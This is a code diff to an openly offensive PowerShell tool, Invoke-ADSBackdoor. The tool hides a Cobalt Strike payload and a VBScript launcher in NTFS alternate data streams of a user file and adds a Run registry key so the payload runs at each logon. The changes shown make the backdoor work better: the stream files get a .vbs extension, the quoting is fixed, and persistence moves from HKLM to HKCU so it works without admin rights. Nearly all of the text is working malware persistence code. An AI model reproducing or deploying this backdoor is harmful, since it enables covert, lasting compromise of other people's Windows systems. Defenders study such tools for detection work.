@@ -39,9 +39,11 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
         $backdoored_file_path = "$env:USERPROFILE\AppData"
     }
 
+    $backdoored_file_path = [System.Environment]::ExpandEnvironmentVariables($backdoored_file_path)
+
     $payload = $cobaltstrike_gen_payload
-    $payload_adsfile_name = [System.IO.Path]::GetRandomFileName()
-    $wrapper_adsfile_name = [System.IO.Path]::GetRandomFileName()
+    $payload_adsfile_name = [System.IO.Path]::GetRandomFileName() + ".vbs"
+    $wrapper_adsfile_name = [System.IO.Path]::GetRandomFileName() + ".vbs"
 
     $vbstext1 = "Dim objShell"
     $vbstext2 = "Set objShell = WScript.CreateObject(""WScript.Shell"")"
@@ -53,17 +55,17 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     $backADSFile = "$backdoored_file_path" + ":$payload_adsfile_name"
     $wrapADSFile = "$backdoored_file_path" + ":$wrapper_adsfile_name"
 
-    $createPayloadADS = {cmd /C "echo `"$payload`" > `"$backADSFile`""}
-    $createWrapperADS = {cmd /C "echo `"$vbtext`" > `"$wrapADSFile`""}
+    $createPayloadADS = {cmd /C "echo $payload > `"$backADSFile`""}
+    $createWrapperADS = {cmd /C "echo $vbtext > `"$wrapADSFile`""}
 
     Invoke-Command -ScriptBlock $createPayloadADS
     Invoke-Command -ScriptBlock $createWrapperADS
     
-    $backCommand = "`"wscript.exe " + "$backdoored_file_path" + ":$wrapper_adsfile_name`""
-    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
+    $backCommand = "wscript.exe " + "`"$backdoored_file_path" + ":$wrapper_adsfile_name`""
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
     # TODO: make key path selectable. For reference, see: https://support.microsoft.com/en-us/kb/314866 & http://www.differencebetween.net/technology/hardware-technology/difference-between-hkey_current_user-and-hkey_local_machine/
     Write-Host "Backdoor Deployed, details provided below; take notes:"
-    Write-Host "Reg key path: HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
+    Write-Host "Reg key path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
     Write-Host "Payload path: $backADSFile"
     Write-Host "Wrapper path: $wrapADSFile"
 }
